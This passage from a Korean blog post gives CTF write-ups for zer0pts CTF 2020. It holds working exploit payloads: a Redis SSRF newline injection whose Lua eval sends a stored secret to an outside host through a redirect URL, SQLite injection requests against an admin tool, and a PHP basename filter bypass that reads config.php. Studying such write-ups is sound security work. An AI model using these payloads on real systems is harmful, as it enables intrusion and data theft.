class="title">get</span><span class="params">(sock, key)</span></span></span><br><span class="line">  query(sock, <span class="string">"GET <span class="subst">#&#123;key&#125;</span>"</span>)</span><br><span class="line">  <span class="keyword">return</span> recv(sock)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">before <span class="keyword">do</span></span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, <span class="string">"flag"</span>, File.read(<span class="string">"flag.txt"</span>).strip)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> params.has_key?(<span class="symbol">:q</span>) <span class="keyword">then</span></span><br><span class="line">    q = params[<span class="symbol">:q</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (q =~ <span class="regexp">/^[0-9a-f]&#123;16&#125;$/</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    sock = connect()</span><br><span class="line">    url = get(sock, q)</span><br><span class="line">    redirect url</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  send_file <span class="string">'index.html'</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">'/'</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> params.has_key?(<span class="symbol">:url</span>) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  url = params[<span class="symbol">:url</span>]</span><br><span class="line">  <span class="keyword">if</span> <span class="keyword">not</span> (url =~ URI.regexp) <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  key = Random.urandom(<span class="number">8</span>).unpack(<span class="string">"H*"</span>)[<span class="number">0</span>]</span><br><span class="line">  sock = connect()</span><br><span class="line">  set(sock, key, url)</span><br><span class="line"></span><br><span class="line">  <span class="string">"<span class="subst">#&#123;request.host&#125;</span>:<span class="subst">#&#123;request.port&#125;</span>/?q=<span class="subst">#&#123;key&#125;</span>"</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>루비로 구성된 redis ssrf 문제입니다.<br>개행에 대한 처리가 되어있지 않으므로 flag 키에 저장된 값을 가져와 원하는 대로 저장해서 불러와주면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request 1</span><br><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 117</span><br><span class="line"></span><br><span class="line">url&#x3D;http:&#x2F;&#x2F;rwx.kr</span><br><span class="line">eval &quot;redis.call(&#39;set&#39;,&#39;e41cf0f94e050661&#39;,&#39;http:&#x2F;&#x2F;rwx.kr?&#39;..redis.call(&#39;get&#39;,&#39;flag&#39;));return 1;&quot; 0</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Request 2</span><br><span class="line">GET &#x2F;?q&#x3D;e41cf0f94e050661 HTTP&#x2F;1.1</span><br><span class="line">Host: 3.112.201.75:8004</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 302 Found</span><br><span class="line">Content-Type: text&#x2F;html;charset&#x3D;utf-8</span><br><span class="line">Location: http:&#x2F;&#x2F;rwx.kr?zer0pts&#123;sh0rt_t0_10ng_10ng_t0_sh0rt&#125;</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Xss-Protection: 1; mode&#x3D;block</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Server: WEBrick&#x2F;1.6.0 (Ruby&#x2F;2.7.0&#x2F;2019-12-25)</span><br><span class="line">Date: Sun, 08 Mar 2020 21:40:28 GMT</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><h2 id="755pts-phpNantokaAdmin"><a href="#755pts-phpNantokaAdmin" class="headerlink" title="[755pts] phpNantokaAdmin"></a>[755pts] phpNantokaAdmin</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/phpNantokaAdmin_49b112bf908ecef40f17684f4120b0aa.tar.gz" target="_blank" rel="noopener">phpNantokaAdmin</a></li></ul><blockquote><p><strong>phpNantokaAdmin</strong> is a management tool for SQLite.</p></blockquote><p>Sqlite injection 문제입니다. 기존에 sqlite 에 대한 연구가 부족했기에 푸는데에 꽤나 오래 걸렸습니다.</p><p>본 문제를 해결하기 위해 응용되는 sqlite 문법은 총 3가지 입니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> [<span class="keyword">sql</span>] <span class="keyword">from</span> sqlite_master;</span><br></pre></td></tr></table></figure><p>첫번째는 square bracket 입니다.<br>mssql 구문과의 호환성을 위해 sqlite 에서는 square bracket 을 다른 쿼트와 같은 기능을 할 수 있도록 지원하고 있습니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl (somecol <span class="built_in">INT</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> sometbl <span class="keyword">values</span>(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">select</span> somecol <span class="keyword">from</span> sometbl;</span><br><span class="line">// 1</span><br><span class="line"><span class="keyword">select</span> somecol somecoaaaal <span class="keyword">from</span> sometbl;</span><br><span class="line">// 1</span><br></pre></td></tr></table></figure><p>두번째는 잘못된 문법 사용에 대한 것인데, sqlite 에서는 컬럼 사이에 반점을 붙여주지 않으면 실제로 존재하는 컬럼인지에 관계없이 뒤에 오는 컬럼명을 무시합니다.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> sometbl2 <span class="keyword">as</span> <span class="keyword">select</span> <span class="number">2</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> sometbl2;</span><br><span class="line">2</span><br></pre></td></tr></table></figure><p>세번째는 <code>create table .. as select ..</code> 문입니다.<br>본 구문은 괄호 없이 테이블 생성을 가능하도록 합니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?page&#x3D;create HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name&#x3D;[aaa]as select [sql][&amp;columns[0][name]&#x3D;]from sqlite_master;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090320124.png" alt="image-20200309090320124"></p><p>위에서 제시한 세가지 문법을 사용한 후, <code>/?page=index</code> 에 접속하면 플래그가 들어있는 테이블과 컬럼명을 확인할 수 있습니다. 이후에는 같은 방법으로 플래그를 읽으면 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?page&#x3D;create HTTP&#x2F;1.1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">table_name&#x3D;[aaa]as select [flag_2a2d04c3][&amp;columns[0][name]&#x3D;]from flag_bf1811da;&amp;columns[0][type]&#x3D;2</span><br></pre></td></tr></table></figure><p><img src="/img/2020/03/image-20200309090554181.png" alt="image-20200309090554181"></p><h2 id="345pts-Can-you-guess-it-2nd-solve"><a href="#345pts-Can-you-guess-it-2nd-solve" class="headerlink" title="[345pts] Can you guess it (2nd solve)"></a>[345pts] Can you guess it (2nd solve)</h2><ul><li><a href="https://file.rwx.kr/ctf/2020/zer0pts/Can%20you%20guess%20it%3F_ffc668f78ed564bf7a62463fd16bc26c.tar.gz" target="_blank" rel="noopener">Can_you_guess_it.tar.gz</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[<span class="string">'PHP_SELF'</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'guess'</span>])) &#123;</span><br><span class="line">  $guess = (string) $_POST[<span class="string">'guess'</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = <span class="string">'Congratulations! The flag is: '</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $message = <span class="string">'Wrong.'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;<span class="keyword">If</span> your guess is correct, I<span class="string">'ll give you the flag.&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;a href="?source"&gt;Source&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;hr&gt;</span></span><br><span class="line"><span class="string">&lt;?php if (isset($message)) &#123; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="POST"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="text" name="guess"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="submit"&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">  &lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br></pre></td></tr></table></figure><p>게싱을 가장한 필터 바이패스 문제입니다.</p><table><thead><tr><th>Path</th><th>PHP_SELF</th></tr></thead><tbody><tr><td>/</td><td>index.php</td></tr><tr><td>/index.php</td><td>index.php</td></tr><tr><td>/index.php/config.php</td><td>index.php/config.php</td></tr></tbody></table><p>먼저 우리는 <code>PHP_SELF</code>가 조작될 수 있는 값이라는 것을 알아야 합니다.</p><p>따라서 index.php 가 붙은 앞부분은 어쩔 수 없지만, 뒷부분은 자유롭게 컨트롤 가능하므로 basename 함수를 통해 highlight_file 함수 인자로 전달되므로 <code>index.php/config.php</code> 는 <code>config.php</code> 를 출력하게 만듭니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/config\.php\/*$/i'</span>, $_SERVER[<span class="string">'PHP_SELF'</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">"I don't know what you are thinking, but I won't let you read it :)"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>그러나 여기서 문제가 발생합니다.<br>정규식 필터링을 수행하고 있는데 이에 걸리면 즉시 종료됩니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php &gt; var_dump(basename(<span class="string">"index.php/config.php/\xbb"</span>));</span><br><span class="line"><span class="comment">// "config.php"</span></span><br></pre></td></tr></table></figure><p>그러나 php는 우리를 배신하지 않습니다.<br>basename 함수는 뒤에 오는 <code>[\x80-\xff]</code> 범위의 문자열에 대해서는 철저히 무시합니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://3.112.201.75:8003/index.php/config.php/%bb?source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'FLAG'</span>, <span class="string">'zer0pts&#123;gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n&#125;'</span>);</span><br></pre></td></tr></table></figure><p>따라서 위 주소를 통해 플래그를 읽어올 수 있습니다.</p></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the comments.</noscript></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#332pts-notepad-1st-solve"><span class="toc-number">1.</span> <span class="toc-text">[332pts] notepad (1st solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#653pts-MusicBlog-2nd-solve"><span class="toc-number">2.</span> <span class="toc-text">[653pts] MusicBlog (2nd solve)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#435pts-urlapp"><span class="toc-number">3.</span> <span class="toc-text">[435pts] urlapp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#755pts-phpNantokaAdmin"><span class="toc-number">4.</span> <span class="toc-text">[755pts] phpNantokaAdmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#345pts-Can-you-guess-it-2nd-solve"><span class="toc-number">5.</span> <span class="toc-text">[345pts] Can you guess it (2nd solve)</span></a></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.p6.is/zer0pts-CTF-2020/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.p6.is/zer0pts-CTF-2020/&text=Zer0pts CTF 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><a id="menu" class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a> <a id="toc" class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a> <a id="share" class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a> <a id="top" style="display:none" class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2022 posix</div><div class="footer-right"><nav><ul></ul></nav></div></footer></div><link rel="stylesheet" href="/lib/font-awesome/css/all.min.css"><link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css"><script src="/lib/jquery/jquery.min.js"></script><script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script>$(function(){$(".highlight table").before('<span class="btn-copy tooltipped tooltipped-sw" aria-label="Copy to clipboard!"><i class="far fa-clone"></i></span>'),new ClipboardJS(".btn-copy",{text:function(e){return Array.from(e.nextElementSibling.querySelectorAll(".code")).reduce((e,t)=>e+t.innerText+"\n","")}}).on("success",function(e){e.trigger.setAttribute("aria-label","Copied!"),e.clearSelection()})})</script><script src="/js/main.js"></script><script>!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-158869268-1","auto"),ga("send","pageview")</script><script>var disqus_shortname="posix-blog";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script></body></html>